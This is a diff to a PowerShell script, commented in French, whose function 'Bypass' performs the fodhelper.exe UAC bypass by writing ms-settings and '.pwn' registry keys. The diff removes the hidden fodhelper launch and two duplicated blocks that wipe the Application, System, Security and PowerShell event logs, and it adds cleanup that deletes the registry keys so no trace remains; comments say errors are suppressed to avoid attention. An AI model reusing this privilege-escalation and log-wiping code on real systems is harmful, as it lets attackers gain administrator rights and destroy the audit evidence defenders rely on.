@@ -285,44 +285,19 @@ function Bypass {
         New-Item -Path $regPath2 -Force | Out-Null
         Set-ItemProperty -Path $regPath2 -Name "(default)" -Value ".pwn" -Force
 
-        # Lance fodhelper.exe pour déclencher le contournement UAC.
-        Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden -ErrorAction SilentlyContinue
 
-# Liste des journaux que vous souhaitez effacer
-$logsToClear = @("Application", "System", "Security", "Windows Powershell")  # Ajoutez ou supprimez les noms des journaux ici
 
-# Parcourir chaque journal et le vider s'il existe
-foreach ($logName in $logsToClear) {
-    $eventLog = Get-WmiObject -Class Win32_NTEventlogFile | Where-Object { $_.LogfileName -eq $logName }
-    if ($eventLog) {
-        Write-Host "Effacement du journal : $logName"
-        $eventLog.ClearEventLog()
-    } else {
-        Write-Host "Le journal '$logName' n'existe pas ou n'est pas accessible."
-    }
-}
         # Attends un court instant pour permettre l'exécution.
         Start-Sleep -Seconds 3
-# Liste des journaux que vous souhaitez effacer
-$logsToClear = @("Application", "System", "Security", "Windows Powershell")  # Ajoutez ou supprimez les noms des journaux ici
-
-# Parcourir chaque journal et le vider s'il existe
-foreach ($logName in $logsToClear) {
-    $eventLog = Get-WmiObject -Class Win32_NTEventlogFile | Where-Object { $_.LogfileName -eq $logName }
-    if ($eventLog) {
-        Write-Host "Effacement du journal : $logName"
-        $eventLog.ClearEventLog()
-    } else {
-        Write-Host "Le journal '$logName' n'existe pas ou n'est pas accessible."
-    }
-}
     }
     catch {
         # Ne pas afficher explicitement l'erreur pour éviter d'attirer l'attention.
         return
     }
     finally {
-
+        # Nettoie les clés de registre créées pour éviter toute trace persistante.
+        Remove-Item -Path "HKCU:\Software\Classes\ms-settings\" -Recurse -Force -ErrorAction SilentlyContinue
+        Remove-Item -Path "HKCU:\Software\Classes\.pwn\" -Recurse -Force -ErrorAction SilentlyContinue
     }
 }
 
